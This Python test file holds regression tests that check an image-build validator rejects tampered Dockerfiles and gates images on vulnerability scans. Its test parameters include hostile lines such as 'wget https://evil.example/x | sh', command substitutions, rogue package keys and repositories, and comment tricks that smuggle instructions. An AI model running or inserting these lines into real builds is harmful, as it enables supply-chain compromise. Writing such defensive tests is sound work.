"""Fail-closed regressions for PR #8 Verify 1."""

import json
from datetime import UTC, datetime, timedelta
from pathlib import Path
from types import SimpleNamespace
from typing import Any, NoReturn

import pytest

from scripts import images
from tests.gates.test_image_revision import grype_report
from tests.gates.test_images import configured as configured


@pytest.mark.req("NFR-024", kind="configuration check", part="source-rejection")
@pytest.mark.parametrize(
    "recipe,line",
    [
        ("go", "ENV A=b# GOTOOLCHAIN=go1.99.0+auto GOPROXY=direct GOSUMDB=off"),
        ("api", "RUN mkdir -p /x# && wget https://evil.example/x | sh"),
        ("api", "RUN mkdir -p /x\f && wget https://evil.example/x | sh"),
        ("api", "RUN mkdir -p /x\r && wget https://evil.example/x | sh"),
        ("api", "RUN mkdir -p /x\u2028 && wget https://evil.example/x | sh"),
        (
            "api",
            (
                "RUN python -c 'import urllib.request; "
                'urllib.request.urlopen("https://evil.example")\''
            ),
        ),
        ("postgres", "RUN gosu root /usr/bin/wget https://evil.example/x"),
        ("caddy", "RUN setcap cap_sys_admin+ep /bin/busybox"),
        (
            "python",
            "RUN printf '%s' 'Trusted: yes' > /etc/apt/sources.list.d/debian.sources",
        ),
        ("redis", "RUN printf '%s%s\\n' https:/ /evil.example > /etc/apk/repositories"),
        ("redis", "COPY docker/rogue-key /etc/apk/keys/rogue.rsa.pub"),
        ("go", "ENV UV_INDEX_URL=https://evil.example/simple"),
        ("go", "RUN mkdir -p /z \\\t\nENV GOTOOLCHAIN=local"),
    ],
)
def test_unsupported_source_operations_fail(
    configured: Path, recipe: str, line: str
) -> None:
    images.check_configuration(configured)
    p = configured / f"docker/{recipe}/Dockerfile"
    p.write_text(p.read_text() + "\n" + line + "\n")
    with pytest.raises(ValueError, match="Unsupported|Unapproved|control|ASCII"):
        images.check_configuration(configured)


@pytest.mark.req("NFR-024", kind="configuration check", part="source-rejection")
@pytest.mark.parametrize(
    "separator",
    [
        ";",
        "|",
        "||",
        "&",
        "$(wget https://evil.example/x)",
        "`wget https://evil.example/x`",
    ],
)
def test_shell_composition_rejected(configured: Path, separator: str) -> None:
    images.check_configuration(configured)
    p = configured / "docker/api/Dockerfile"
    p.write_text(
        p.read_text() + f"\nRUN mkdir -p /x {separator} uv pip install --system evil\n"
    )
    with pytest.raises(ValueError, match="Unsupported|Unapproved"):
        images.check_configuration(configured)


@pytest.mark.req("NFR-024", kind="configuration check", part="source-rejection")
@pytest.mark.parametrize(
    "recipe,before,after",
    [
        (
            "caddy",
            "--output /out/caddy",
            "--output /out/caddy# --with evil.example/plugin --output /out/caddy",
        ),
        ("go", "-mod=readonly", "-mod=readonly -mod=mod"),
        ("go", "-mod=readonly", "-mod=readonly --overlay=/evil.json"),
        ("go", "github.com/caddyserver/xcaddy/cmd/xcaddy", "evil.example/tool"),
        (
            "go",
            "docker/go/go.mod docker/go/go.sum",
            "docker/go/alt/go.mod docker/go/alt/go.sum",
        ),
        (
            "caddy",
            "docker/caddy/go.mod docker/caddy/go.sum",
            "docker/caddy/alt/go.mod docker/caddy/alt/go.sum",
        ),
        (
            "postgres",
            "docker/postgres/go.mod docker/postgres/go.sum",
            "docker/postgres/alt/go.mod docker/postgres/alt/go.sum",
        ),
        ("go", "&& go mod verify", ""),
        ("go", "GOPROXY=off ", ""),
        ("caddy", "&& cmp /tmp/locked.mod /tmp/effective.mod", ""),
        ("redis", "/alpine/v3.23/", "/alpine/v3.24/"),
    ],
)
def test_required_operations_and_inputs_cannot_be_substituted(
    configured: Path, recipe: str, before: str, after: str
) -> None:
    images.check_configuration(configured)
    p = configured / f"docker/{recipe}/Dockerfile"
    assert before in p.read_text()
    p.write_text(p.read_text().replace(before, after))
    with pytest.raises(ValueError, match="Unsupported|Unapproved"):
        images.check_configuration(configured)


@pytest.mark.req("NFR-026", kind="configuration check", part="scanner-policy-rejection")
@pytest.mark.parametrize("severity", ["Unknown", "", "Unrated"])
@pytest.mark.parametrize("state", ["fixed", "unknown", "", "future-state"])
def test_unrated_findings_with_unresolved_or_available_fixes_block(
    severity: str, state: str
) -> None:
    identity, report = grype_report()
    images.check_grype(report, identity, 0)
    report["matches"] = [
        {"vulnerability": {"severity": severity, "fix": {"state": state}}}
    ]
    with pytest.raises(images.VulnerableImage):
        images.check_grype(report, identity, 0)


@pytest.mark.req("NFR-026", kind="configuration check", part="build-scans")
@pytest.mark.parametrize("tool", ["trivy", "grype"])
def test_each_scanner_blocks_dependent_use(
    configured: Path, monkeypatch: pytest.MonkeyPatch, tool: str
) -> None:
    identity, grype = grype_report()
    trivy: dict[str, Any] = {
        "SchemaVersion": 2,
        "Metadata": {"ImageID": identity["Id"]},
        "Results": [],
    }
    item = {
        "image_id": identity["Id"],
        "docker": identity,
        "reference": "prepared",
        "scan": "t.json",
        "scanner_status": 0,
        "grype_scan": "g.json",
        "grype_status": 0,
    }
    (configured / "t.json").write_text(json.dumps(trivy))
    (configured / "g.json").write_text(json.dumps(grype))

    def inspect(reference: str) -> dict[str, Any]:
        return identity

    monkeypatch.setattr(images, "local_identity", inspect)
    images.require_effective(configured, item)
    if tool == "trivy":
        trivy["Results"] = [
            {"Vulnerabilities": [{"Severity": "CRITICAL", "FixedVersion": "2"}]}
        ]
        item["scanner_status"] = 42
        (configured / "t.json").write_text(json.dumps(trivy))
    else:
        grype["matches"] = [
            {"vulnerability": {"severity": "Critical", "fix": {"state": "fixed"}}}
        ]
        (configured / "g.json").write_text(json.dumps(grype))

    def rejected_inspection(reference: str) -> NoReturn:
        pytest.fail("Rejected input reached dependent use")

    monkeypatch.setattr(images, "local_identity", rejected_inspection)
    with pytest.raises(images.VulnerableImage):
        images.require_effective(configured, item)


@pytest.mark.req("NFR-024", kind="configuration check", part="source-rejection")
@pytest.mark.parametrize(
    "family,path,module,version",
    [
        (
            "builder",
            "github.com/caddyserver/xcaddy/cmd/xcaddy",
            "github.com/caddyserver/xcaddy",
            "v0.4.7",
        ),
        ("caddy", "caddy", "caddy", "(devel)"),
        (
            "postgres",
            "github.com/tianon/gosu",
            "github.com/tianon/gosu",
            "v0.0.0-20261025094355-29b939aa5bd4",
        ),
    ],
)
@pytest.mark.parametrize("mutation", ["path", "module", "toolchain"])
def test_go_binary_identity_matches_approved_source(
    family: str, path: str, module: str, version: str, mutation: str
) -> None:
    info = (
        f"/binary: go1.27.4\n\tpath\t{path}\n\tmod\t{module}\t{version}\n"
        "\tdep\tgithub.com/caddyserver/caddy/v2\tv2.11.9\th1:test\n"
    )
    images.check_go_identity(info, family)
    before, after = {
        "path": (f"path\t{path}", "path\tevil.example/tool"),
        "module": (f"mod\t{module}", "mod\tevil.example/source"),
        "toolchain": ("go1.27.4", "go1.27.3"),
    }[mutation]
    with pytest.raises(ValueError, match="Go binary"):
        images.check_go_identity(info.replace(before, after), family)


@pytest.mark.req("NFR-026", kind="configuration check", part="database-rejection")
@pytest.mark.parametrize("age", [-60, 49 * 60 * 60])
def test_trivy_database_freshness_is_verified(configured: Path, age: int) -> None:
    database = configured / "db"
    database.mkdir()
    metadata = {"UpdatedAt": datetime.now(UTC).isoformat()}
    (database / "metadata.json").write_text(json.dumps(metadata))
    images.check_trivy_database(configured)
    metadata["UpdatedAt"] = (datetime.now(UTC) - timedelta(seconds=age)).isoformat()
    (database / "metadata.json").write_text(json.dumps(metadata))
    with pytest.raises(ValueError, match="Trivy database freshness"):
        images.check_trivy_database(configured)


@pytest.mark.req("NFR-024", kind="configuration check", part="source-rejection")
def test_comment_continuation_cannot_hide_an_instruction(configured: Path) -> None:
    images.check_configuration(configured)
    p = configured / "docker/go/Dockerfile"
    p.write_text(p.read_text() + "\n# innocuous \\\nENV GOPROXY=direct\n")
    with pytest.raises(ValueError, match="Unapproved"):
        images.check_configuration(configured)


def test_local_preparation_invokes_no_scanner(
    configured: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    identity, _ = grype_report()

    def command(*args: str, root: Path) -> str:
        if "inspect" in args:
            return json.dumps(
                {
                    "digest": args[4].split("@")[1],
                    "manifests": [
                        {
                            "digest": "sha256:" + "b" * 64,
                            "platform": {"os": "linux", "architecture": arch},
                        }
                        for arch in ("amd64", "arm64")
                    ],
                }
            )
        return ""

    def build(args: list[str], **kwargs: object) -> object:
        Path(args[args.index("--metadata-file") + 1]).write_text(
            json.dumps({"containerimage.digest": identity["Id"]})
        )
        Path(args[args.index("--iidfile") + 1]).write_text(identity["Id"])
        return SimpleNamespace(returncode=0)

    monkeypatch.setattr(images, "command", command)

    def inspect(reference: str, target: str = images.PLATFORM) -> dict[str, Any]:
        return identity

    def tool(*args: object) -> Path:
        return Path("verified-buildx")

    def no_verification(*args: object, **kwargs: object) -> NoReturn:
        pytest.fail("Local preparation invoked verification")

    monkeypatch.setattr(images, "local_identity", inspect)
    monkeypatch.setattr(images, "verified_tool", tool)
    monkeypatch.setattr(images.subprocess, "run", build)
    for name in ("scanner", "grype", "actual_inventory", "require_effective"):
        monkeypatch.setattr(images, name, no_verification)
    evidence = images.prepared_images(configured, target="linux/arm64")
    assert evidence["verified"] is False
    assert evidence["platform"] == "linux/arm64"
    assert set(evidence["effective"]) == images.expected_effective(configured)
    assert evidence["events"].count("build:application") == 1
    assert set(images.prepared_references(configured, evidence, scanned=False)) == {
        "application",
        "caddy",
        "postgres",
        "REDIS_IMAGE",
        "MAILPIT_IMAGE",
    }


@pytest.mark.req("NFR-026", kind="configuration check", part="build-scans")
@pytest.mark.parametrize("tool", ["trivy", "grype"])
def test_pipeline_stops_on_either_scanner_rejection(
    configured: Path, monkeypatch: pytest.MonkeyPatch, tool: str
) -> None:
    identity, grype = grype_report()

    def inspect(reference: str, target: str = images.PLATFORM) -> dict[str, Any]:
        return identity

    def command(*args: str, root: Path) -> str:
        if "inspect" in args:
            return json.dumps(
                {
                    "digest": args[4].split("@")[1],
                    "manifests": [
                        {
                            "digest": "sha256:" + "b" * 64,
                            "platform": {"os": "linux", "architecture": arch},
                        }
                        for arch in ("amd64", "arm64")
                    ],
                }
            )
        return ""

    def trivy_scan(root: Path, *args: str) -> int:
        path = root / args[args.index("--output") + 1]
        reject = path.name == "fixture.scan.json" or (
            tool == "trivy" and path.name == "MAILPIT_IMAGE.scan.json"
        )
        report = {
            "SchemaVersion": 2,
            "Metadata": {"ImageID": identity["Id"]},
            "Results": [
                {
                    "Vulnerabilities": [
                        {"Severity": severity, "FixedVersion": "2"}
                        for severity in ("HIGH", "CRITICAL")
                    ]
                }
            ]
            if reject
            else [],
        }
        path.write_text(json.dumps(report))
        return 42 if reject else 0

    def grype_scan(
        root: Path, ref: str, report: Path, bom: Path, database: Path
    ) -> int:
        value = dict(grype)
        if tool == "grype" and report.name == "MAILPIT_IMAGE.grype.json":
            value["matches"] = [
                {"vulnerability": {"severity": "Critical", "fix": {"state": "fixed"}}}
            ]
        report.write_text(json.dumps(value))
        return 0

    def no_build(*args: object, **kwargs: object) -> NoReturn:
        pytest.fail("Rejected upstream reached a dependent build")

    monkeypatch.setattr(images, "local_identity", inspect)
    monkeypatch.setattr(images, "command", command)
    monkeypatch.setattr(images, "scanner", trivy_scan)
    monkeypatch.setattr(images, "grype", grype_scan)
    monkeypatch.setattr(images.subprocess, "run", no_build)

    def unused_tool(name: str, root: Path) -> Path:
        return Path("unused")

    monkeypatch.setattr(images, "verified_tool", unused_tool)
    with pytest.raises(images.VulnerableImage):
        images.run_pipeline(configured, database=configured / "db")
    evidence = json.loads((configured / "reports/images/identities.json").read_text())
    assert not evidence["builds"]
    assert not any(e.startswith("build:") for e in evidence["events"])


@pytest.mark.req("NFR-024", kind="configuration check", part="trusted-sources")
def test_go_identity_accepts_standard_replacement_output() -> None:
    info = (
        "/binary: go1.27.4\n\tpath\tcaddy\n\tmod\tcaddy\t(devel)\n"
        "\tdep\tgithub.com/caddyserver/caddy/v2\tv2.11.9\th1:checksum\n"
        "\tdep\tgolang.org/x/net\tv0.60.0\n"
        "\t=>\tgolang.org/x/net\tv0.62.0\th1:checksum\n\n"
        "\tbuild\tGOARCH=amd64\n"
    )
    images.check_go_identity(info, "caddy")
